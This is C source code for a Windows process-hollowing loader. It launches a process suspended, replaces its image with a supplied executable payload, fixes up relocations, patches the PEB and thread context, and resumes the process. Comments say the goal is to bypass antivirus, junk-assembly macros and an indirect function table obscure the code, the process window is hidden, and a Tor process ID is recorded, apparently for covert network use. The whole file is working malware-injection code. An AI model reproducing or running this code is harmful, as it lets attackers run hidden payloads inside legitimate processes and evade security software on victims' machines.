#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "global_config.h"
#include "junk_asm.h"
#include "functions_table.h"

#include <tlhelp32.h>

#include "debug.h"

#include "function_table_core.h"

extern DWORD TOR_PROCESS_ID;

/*
TODO: to bypass antivirus, we need to load the .dll manually
https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/
*/

/*
#pragma comment(lib,"ntdll.lib")

//EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
//EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
//EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
//EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
//EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
//EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
//EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);


// this function sometimes will fails, so do it again & again until success.
int CreateHollowedProcess(char * path, char image[])
{
	ASM_JUNK

	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PVOID mem, base;
	DWORD i, read, nSizeOfFile;

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));


	DBG_MSG("CreateHollowedProcess() - Running the target executable.\n");

	if (!l_CreateProcessA(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) // Start the target application
	{
		DBG_MSG("CreateHollowedProcess() - Error: Unable to run the target executable. CreateProcess failed with error %d\n", l_GetLastError());
		return 1;
	}

	

	DBG_MSG("CreateHollowedProcess() - Process created in suspended state.\n");

	pIDH = (PIMAGE_DOS_HEADER)image;

	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		DBG_MSG("CreateHollowedProcess() - Error: Invalid executable format.\n");
		l_NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS

	l_NtGetContextThread(pi.hThread, &ctx); // Get the thread context of the child process's primary thread
	l_NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &base, sizeof(PVOID), NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB


	DBG_MSG("CreateHollowedProcess() - base: %d\n", base);
	DBG_MSG("CreateHollowedProcess() - pINH->OptionalHeader.ImageBase: %d\n", pINH->OptionalHeader.ImageBase);

	if ((DWORD)base == pINH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		DBG_MSG("CreateHollowedProcess() - Unmapping original executable image from child process. Address: 0x%p\n", base);
		l_NtUnmapViewOfSection(pi.hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}

	DBG_MSG("CreateHollowedProcess() - Allocating memory in child process. Size: %d\n", pINH->OptionalHeader.SizeOfImage);

	mem = l_VirtualAllocEx(pi.hProcess, (PVOID)pINH->OptionalHeader.ImageBase, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image

	if (!mem)
	{
		DBG_MSG("CreateHollowedProcess() - Error: Unable to allocate memory in child process. l_VirtualAllocEx() failed with error %d.\n", l_GetLastError());

		l_NtTerminateProcess(pi.hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	DBG_MSG("CreateHollowedProcess() - Memory allocated. Address: 0x%p\n", mem);

	DBG_MSG("CreateHollowedProcess() - Writing executable image into child process.\n");

	l_NtWriteVirtualMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL); // Write the header of the replacement executable into child process

	for (i = 0; i<pINH->FileHeader.NumberOfSections; i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i*sizeof(IMAGE_SECTION_HEADER)));
		l_NtWriteVirtualMemory(pi.hProcess, (PVOID)((LPBYTE)mem + pISH->VirtualAddress), (PVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}

	ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image

	DBG_MSG("CreateHollowedProcess() - New entry point: 0x%p\n", ctx.Eax);

	l_NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pINH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); // Write the base address of the injected image into the PEB

	DBG_MSG("CreateHollowedProcess() - Setting the context of the child process's primary thread.\n");

	l_NtSetContextThread(pi.hThread, &ctx); // Set the thread context of the child process's primary thread

	DBG_MSG("CreateHollowedProcess() - Resuming child process's primary thread.\n");

	l_NtResumeThread(pi.hThread, NULL); // Resume the primary thread

	DBG_MSG("CreateHollowedProcess() - Thread resumed.\n");

	//NtWaitForSingleObject(pi.hProcess, FALSE, NULL); // Wait for the child process to terminate

	l_NtClose(pi.hThread); // Close the thread handle
	l_NtClose(pi.hProcess); // Close the process handle

	//
	TOR_PROCESS_ID = pi.dwProcessId;

	//VirtualFree(image, 0, MEM_RELEASE); // Free the allocated memory
	DBG_MSG("CreateHollowedProcess() - ENDED.\n");
	
	return 0;
}
*/


#include <Windows.h>
#include <winternl.h>
#include <stddef.h>



#define GET_NTHDRS(module) \
	((IMAGE_NT_HEADERS *) \
	((char *)module + ((IMAGE_DOS_HEADER *)module)->e_lfanew))


DWORD rva_to_raw(DWORD rva, const IMAGE_NT_HEADERS* nthdrs)
{
	const IMAGE_SECTION_HEADER* sec_hdr;
	WORD nsections;

	sec_hdr = (IMAGE_SECTION_HEADER*)(nthdrs + 1);

	for (nsections = 0; nsections < nthdrs->FileHeader.NumberOfSections; nsections++) {
		DWORD sec_size;

		sec_size = nsections == nthdrs->FileHeader.NumberOfSections - 1 ?
			sec_hdr->Misc.VirtualSize : (sec_hdr + 1)->VirtualAddress - sec_hdr->VirtualAddress;
		
		if (rva >= sec_hdr->VirtualAddress &&
			rva < sec_hdr->VirtualAddress + sec_size)
			
			return sec_hdr->PointerToRawData + (rva - sec_hdr->VirtualAddress);
		
		++sec_hdr;
	}
	
	
	return 0;
}

const void* get_targeted_exe_PEB(HANDLE proc)
{
	DBG_MSG("get_targeted_exe_PEB() called.\n");
	PROCESS_BASIC_INFORMATION pbi;
	DWORD ret_len;
	
	return l_NtQueryInformationProcess(proc, ProcessBasicInformation, &pbi,
		sizeof(pbi), &ret_len) == 0 ? pbi.PebBaseAddress : NULL;

}

int read_pmem_wrap(HANDLE proc, const void* addr, void* buffer, SIZE_T size)
{
	DBG_MSG("read_pmem_wrap() called.\n");

	int ret;
	SIZE_T read;
	ret = l_ReadProcessMemory(proc, addr, buffer, size, &read);
	return ret && read == size;
}

int write_pmem_wrap(HANDLE proc, void* addr, const void* buffer, SIZE_T size)
{
	DBG_MSG("write_pmem_wrap() called.\n");

	int ret;
	SIZE_T written;
	ret = l_WriteProcessMemory(proc, addr, buffer, size, &written);
	return ret && written == size;
}

#define PEB_BASE_ADDR_OFFSET	8

int get_targeted_exe_base_addr(HANDLE proc, const void* targeted_exe_peb_addr, DWORD* base_addr)
{
	DBG_MSG("get_targeted_exe_base_addr() called.\n");

	return read_pmem_wrap(proc, ((char*)targeted_exe_peb_addr + PEB_BASE_ADDR_OFFSET),
		base_addr, sizeof(*base_addr));
}

int set_targeted_exe_base_addr(HANDLE proc, const void* targeted_exe_peb_addr, DWORD base_addr)
{
	return write_pmem_wrap(proc, ((char*)targeted_exe_peb_addr + PEB_BASE_ADDR_OFFSET),
		&base_addr, sizeof(base_addr));
}

int get_targeted_exe_image_size(HANDLE proc, const void* payload_image_base, DWORD* image_size)
{
	DBG_MSG("get_targeted_exe_image_size() called.\n");

	IMAGE_DOS_HEADER doshdr;
	if (!read_pmem_wrap(proc, payload_image_base, &doshdr, sizeof(doshdr)))
		return 0;
	return read_pmem_wrap(proc, ((char*)payload_image_base + doshdr.e_lfanew +
		offsetof(IMAGE_NT_HEADERS, OptionalHeader.SizeOfImage)),
		image_size, sizeof(*image_size));
}

int dir_exists(const IMAGE_NT_HEADERS* nthdrs, int dir_type)
{
	const IMAGE_DATA_DIRECTORY* dir_entry;
	dir_entry = &nthdrs->OptionalHeader.DataDirectory[dir_type];
	return dir_entry->VirtualAddress != 0 && dir_entry->Size != 0;
}

int is_relocatable(const IMAGE_NT_HEADERS* nthdrs)
{
	DBG_MSG("is_relocatable() called.\n");
	
	return !(nthdrs->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) &&
		dir_exists(nthdrs, IMAGE_DIRECTORY_ENTRY_BASERELOC);
}

int copy_headers(HANDLE proc, void* base, const void* src)
{
	DBG_MSG("copy_headers() called.\n");

	const IMAGE_NT_HEADERS* nthdrs;

	nthdrs = GET_NTHDRS(src);
	return write_pmem_wrap(proc, base, src, nthdrs->OptionalHeader.SizeOfHeaders);
}

int copy_sections(HANDLE proc, void* base, const void* src)
{
	DBG_MSG("copy_sections() called.\n");

	const IMAGE_NT_HEADERS* nthdrs;
	const IMAGE_SECTION_HEADER* sechdr;
	WORD i;

	nthdrs = GET_NTHDRS(src);
	sechdr = (IMAGE_SECTION_HEADER*)(nthdrs + 1);

	DBG_MSG("copy_sections() - number of sections: %d\n", nthdrs->FileHeader.NumberOfSections);


	for (i = 0; i < nthdrs->FileHeader.NumberOfSections; ++i) {
		void* sec_dest;

		if (sechdr[i].PointerToRawData == 0)
			continue;

		sec_dest = (char*)base + sechdr[i].VirtualAddress;
		if (!write_pmem_wrap(proc, sec_dest,
			(char*)src + sechdr[i].PointerToRawData, sechdr[i].SizeOfRawData))
			
			return 0;
	}
	return 1;
}

// executable, readable, writable
DWORD secp2vmemp[2][2][2] = {
	{
		//not executable
		{PAGE_NOACCESS, PAGE_WRITECOPY},
		{PAGE_READONLY, PAGE_READWRITE}
	},
	{
		//executable
		{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
		{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}
	}
};

DWORD secp_to_vmemp(DWORD secp)
{
	DWORD vmemp;
	int executable, readable, writable;

	executable = (secp & IMAGE_SCN_MEM_EXECUTE) != 0;
	readable = (secp & IMAGE_SCN_MEM_READ) != 0;
	writable = (secp & IMAGE_SCN_MEM_WRITE) != 0;

	vmemp = secp2vmemp[executable][readable][writable];

	if (secp & IMAGE_SCN_MEM_NOT_CACHED)
		vmemp |= PAGE_NOCACHE;

	return vmemp;
}

int protect_targeted_exe_secs(HANDLE proc, void* base, const IMAGE_NT_HEADERS* snthdrs)
{
	DBG_MSG("protect_targeted_exe_secs() called.\n");

	IMAGE_SECTION_HEADER* sec_hdr;
	DWORD old_prot, new_prot;
	WORD i;

	// protect the PE headers 
	l_VirtualProtectEx(proc, base, snthdrs->OptionalHeader.SizeOfHeaders,
		PAGE_READONLY, &old_prot);

	// protect the image sections 
	sec_hdr = (IMAGE_SECTION_HEADER*)(snthdrs + 1);
	for (i = 0; i < snthdrs->FileHeader.NumberOfSections; ++i) {
		void* section;
		section = (char*)base + sec_hdr[i].VirtualAddress;
		new_prot = secp_to_vmemp(sec_hdr[i].Characteristics);
		if (!l_VirtualProtectEx(proc,
			section,
			sec_hdr[i].Misc.VirtualSize,	// pages affected in the range are changed 
			new_prot,
			&old_prot))
			return 0;
	}
	return 1;
}

// fix the relocations on a raw file 
void fix_relocs_raw_hlp(IMAGE_BASE_RELOCATION* base_reloc, DWORD dir_size,
	void* map, DWORD delta)
{
	DBG_MSG("fix_relocs_raw_hlp() called.\n");

	IMAGE_NT_HEADERS* nthdrs;
	IMAGE_BASE_RELOCATION* cur_reloc, * reloc_end;

	nthdrs = GET_NTHDRS(map);

	cur_reloc = base_reloc;
	reloc_end = (IMAGE_BASE_RELOCATION*)((char*)base_reloc + dir_size);

	while (cur_reloc < reloc_end && cur_reloc->SizeOfBlock) {
		int count;
		WORD* cur_entry;
		void* page_raw;

		count = (cur_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		cur_entry = (WORD*)(cur_reloc + 1);
		page_raw = (char*)map + rva_to_raw(cur_reloc->VirtualAddress, nthdrs);
		while (count--) {
			// is valid x86 relocation? 
			if (*cur_entry >> 12 == IMAGE_REL_BASED_HIGHLOW)
				*(DWORD_PTR*)((char*)page_raw + (*cur_entry & 0x0fff)) += delta;

			cur_entry++;
		}
		
		// advance to the next reloc entry 
		cur_reloc = (IMAGE_BASE_RELOCATION*)((char*)cur_reloc + cur_reloc->SizeOfBlock);
	}
}

void fix_relocs_raw(void* map, DWORD_PTR dest_addr, DWORD payload_image_base)
{
	DBG_MSG("fix_relocs_raw() called.\n");

	// we need to perform fix ups on the source 
	const IMAGE_NT_HEADERS* nthdrs;
	const IMAGE_DATA_DIRECTORY* reloc_dir_entry;
	IMAGE_BASE_RELOCATION* base_reloc;
	DWORD delta;
	nthdrs = GET_NTHDRS(map);

	reloc_dir_entry = &nthdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	base_reloc = (IMAGE_BASE_RELOCATION*)((char*)map +
		rva_to_raw(reloc_dir_entry->VirtualAddress, nthdrs));

	delta = dest_addr - payload_image_base;
	fix_relocs_raw_hlp(base_reloc, reloc_dir_entry->Size, map, delta);
}

int ph_init(void)
{
	return 1;
}
///
///
static BOOL suspend_process(DWORD pid)
{
	HANDLE        hThreadSnap = NULL;
	BOOL          bRet = FALSE;
	THREADENTRY32 te32 = { 0 };


	DBG_MSG("suspend_process() - pid: %d\n", pid);

	// Take a snapshot of all threads currently in the system. 

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return (FALSE);

	// Fill in the size of the structure before using it. 

	te32.dwSize = sizeof(THREADENTRY32);

	// Walk the thread snapshot to find all threads of the process. 
	// If the thread belongs to the process, add its information 
	// to the display list.


	DBG_MSG("pause_resume_process() - Traversing the list of threads. \n");

	if (Thread32First(hThreadSnap, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == pid)
			{
				HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);

				DBG_MSG("pause_resume_process() - suspending thread id: %s \n", te32.th32ThreadID);
				SuspendThread(hThread);
				
				l_CloseHandle(hThread);
			}
		} while (Thread32Next(hThreadSnap, &te32));
		bRet = TRUE;
	}
	else
		bRet = FALSE;          // could not walk the list of threads 

	// Do not forget to clean up the snapshot object. 
	l_CloseHandle(hThreadSnap);

	return (bRet);
}




/// <summary>
///
/// </summary>
/// <param name="name"></param>
/// <param name="cmd_line"></param>
/// <param name="map"></param>
/// <returns></returns>
int create_hollowed_proc(const char* name, char* cmd_line, void* map, DWORD * tor_process_id)
{
	STARTUPINFOA sinfo;
	PROCESS_INFORMATION pinfo;
	const void* targeted_exe_peb_addr;
	DWORD_PTR targeted_exe_base_addr;
	DWORD targeted_exe_image_size;
	void* dest;
	IMAGE_NT_HEADERS* nthdrs;
	DWORD payload_image_base;
	CONTEXT cntx;
	int res;

	dest = NULL;
	res = 1;

	//
	DBG_MSG("create_hollowed_proc() - cmd_line: %s \n", cmd_line);

	//
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	memset(&pinfo, 0, sizeof(pinfo));


	// as per discussion here, we create process, then suspend it after that. http://www.rohitab.com/discuss/topic/42237-understanding-process-hollowing/

#if DEBUG_MODE == 1
	DBG_MSG("create_hollowed_proc() - 1.\n");
	if (!l_CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE, CREATE_SUSPENDED | REALTIME_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo))
	{
		DBG_MSG("create_hollowed_proc() - CreateProcessA() failed, error code: %d\n", l_GetLastError());
		return 1;
	}
#else
	DBG_MSG("create_hollowed_proc() - 1.\n");
	if (!l_CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW | REALTIME_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo))
	{
		DBG_MSG("create_hollowed_proc() - CreateProcessA() failed, error code: %d\n", l_GetLastError());
		return 1;
	}
#endif

	/*
	DBG_MSG("create_hollowed_proc() - 1.1\n");
	// suspend the created process, then resume it.
	bool ret_suspend_process = suspend_process(pinfo.dwProcessId);

	if (!ret_suspend_process) {
		DBG_MSG("create_hollowed_proc() - suspend_process() SUSPEND failed, error code: %d\n", l_GetLastError());
		return 1;
	}
	*/

	DBG_MSG("create_hollowed_proc() - CreateProcessA() created in SUSPENDED MODE.\n");
	
	DBG_MSG("create_hollowed_proc() - 2.\n");
	if (!(targeted_exe_peb_addr = get_targeted_exe_PEB(pinfo.hProcess)) ||
		!get_targeted_exe_base_addr(pinfo.hProcess, targeted_exe_peb_addr, &targeted_exe_base_addr) ||
		!get_targeted_exe_image_size(pinfo.hProcess, (void*)targeted_exe_base_addr, &targeted_exe_image_size))

	{
		DBG_MSG("create_hollowed_proc() - !(targeted_exe_peb_addr = get_targeted_exe_PEB(pinfo.hProcess).\n");
		goto cleanup;
	}

	DBG_MSG("create_hollowed_proc() - targeted_exe_peb_addr: 0x%p\n", (DWORD_PTR)targeted_exe_peb_addr);
	DBG_MSG("create_hollowed_proc() - targeted_exe_base_addr: 0x%p\n", targeted_exe_base_addr);
	DBG_MSG("create_hollowed_proc() - targeted_exe_image_size: 0x%p\n", targeted_exe_image_size);
	
	
	DBG_MSG("create_hollowed_proc() - 2.1 - map: 0x%p \n", map);
	nthdrs = GET_NTHDRS(map);

	DBG_MSG("create_hollowed_proc() - 2.2 \n");
	payload_image_base = nthdrs->OptionalHeader.ImageBase;

	DBG_MSG("create_hollowed_proc() - payload_image_base: 0x%p\n", payload_image_base);


	if (!dest) {
		DBG_MSG("create_hollowed_proc() - 2.3 \n");

		if (is_relocatable(nthdrs)) {
			DBG_MSG("create_hollowed_proc() - 3.\n");

			// try to map it onto the process's image base 
			if (l_NtUnmapViewOfSection(pinfo.hProcess, (void*)targeted_exe_base_addr) == 0)
			{
				dest = l_VirtualAllocEx(
					pinfo.hProcess,
					(void*)targeted_exe_base_addr,
					nthdrs->OptionalHeader.SizeOfImage,
					MEM_RESERVE | MEM_COMMIT,
					PAGE_READWRITE);

				if (!dest) {
					DBG_MSG("create_hollowed_proc() - VirtualAllocEx()-1 failed, error code: %d\n", l_GetLastError());
				}
				else {
					DBG_MSG("create_hollowed_proc() - VirtualAllocEx()-1 at address: 0x%p\n", dest);
				}
			}
			else {
				DBG_MSG("create_hollowed_proc() - pNtUnmapViewOfSection() failed, error code: %d\n", l_GetLastError());
			}
				

			DBG_MSG("create_hollowed_proc() - 4.\n");
			// if that failed, map it on any other free address space 
			if (!dest && !(dest = l_VirtualAllocEx(
				pinfo.hProcess,
				NULL,
				nthdrs->OptionalHeader.SizeOfImage,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_READWRITE)))

			{

				DBG_MSG("create_hollowed_proc() - VirtualAllocEx()-2 failed, error code: %d\n", l_GetLastError());
				goto cleanup;
			}
			else {
				DBG_MSG("create_hollowed_proc() - VirtualAllocEx()-2 at address: 0x%p\n", dest);
			}
				
				

			// change the ImageBase before the headers get copied 
			nthdrs->OptionalHeader.ImageBase = (DWORD_PTR)dest;

			DBG_MSG("create_hollowed_proc() - change the ImageBase before the headers get copied, nthdrs->OptionalHeader.ImageBase: 0x%p, (DWORD_PTR)dest: 0x%p\n", nthdrs->OptionalHeader.ImageBase, (DWORD_PTR)dest);
		}
		else {
			DBG_MSG("create_hollowed_proc() - 5.\n");
			// tryp to unmap the destination pages, if they exist 
			l_NtUnmapViewOfSection(pinfo.hProcess, (void*)payload_image_base);

			// can only map on the image base if we don't have reloc table 
			if (!(dest = l_VirtualAllocEx(pinfo.hProcess, (void*)payload_image_base,
				nthdrs->OptionalHeader.SizeOfImage,
				MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {

				DBG_MSG("create_hollowed_proc() - pNtUnmapViewOfSection() failed, error code: %d\n", l_GetLastError());
				goto cleanup;
			}
				
		}
	}

	// relocated ? 
	if (dest != (void*)payload_image_base) {
		DBG_MSG("create_hollowed_proc() - 6.\n");
		fix_relocs_raw(map, (DWORD_PTR)dest, payload_image_base);
	}
		

	DBG_MSG("create_hollowed_proc() - 7.\n");
	if (!copy_headers(pinfo.hProcess, dest, map) ||
		!copy_sections(pinfo.hProcess, dest, map) ||
		!protect_targeted_exe_secs(pinfo.hProcess, dest, nthdrs)) {

		DBG_MSG("create_hollowed_proc() - copy_headers() or copy_sections() or protect_targeted_exe_secs() failed.\n");
		goto cleanup;
	}
		
	DBG_MSG("create_hollowed_proc() - 8.\n");
	// change the imagebase entry on the PEB if it's changed 
	if ((DWORD_PTR)dest != targeted_exe_base_addr &&
		!set_targeted_exe_base_addr(pinfo.hProcess, targeted_exe_peb_addr, (DWORD)dest)) {
		
		DBG_MSG("create_hollowed_proc() - change the imagebase entry on the PEB if it's changed .\n");
		goto cleanup;
	}
	
	DBG_MSG("create_hollowed_proc() - 9.\n");

	// resume the suspended process 
	cntx.ContextFlags = CONTEXT_FULL;


	if (!l_GetThreadContext(pinfo.hThread, &cntx)) {
		DBG_MSG("create_hollowed_proc() - GetThreadContext() failed, error code: %d .\n", l_GetLastError());
		goto cleanup;
	}
	
	DBG_MSG("create_hollowed_proc() - 10.\n");

	cntx.Eax = (DWORD_PTR)dest + nthdrs->OptionalHeader.AddressOfEntryPoint;

	if (!l_SetThreadContext(pinfo.hThread, &cntx)) {

		DBG_MSG("create_hollowed_proc() - SetThreadContext() failed, error code: %d .\n", l_GetLastError());
		goto cleanup;
	}


	//l_Sleep(180000);

	
	if (
		l_ResumeThread(pinfo.hThread) == (DWORD)-1
		)
	{

		DBG_MSG("create_hollowed_proc() - ResumeThread() failed, error code: %d .\n", l_GetLastError());
		goto cleanup;
	}
	
	DBG_MSG("create_hollowed_proc() - 11.\n");
	
	res = 0;
cleanup:
	if (res != 0) {
		DBG_MSG("create_hollowed_proc() - FAILED ...\n");
		l_TerminateProcess(pinfo.hProcess, 0);

		l_CloseHandle(pinfo.hThread);
		l_CloseHandle(pinfo.hProcess);
	}
	else {
		DBG_MSG("create_hollowed_proc() - SUCCESSSS ...\n");

		*tor_process_id = pinfo.dwProcessId;

		l_CloseHandle(pinfo.hThread);
		l_CloseHandle(pinfo.hProcess);
	}

	return res;
}

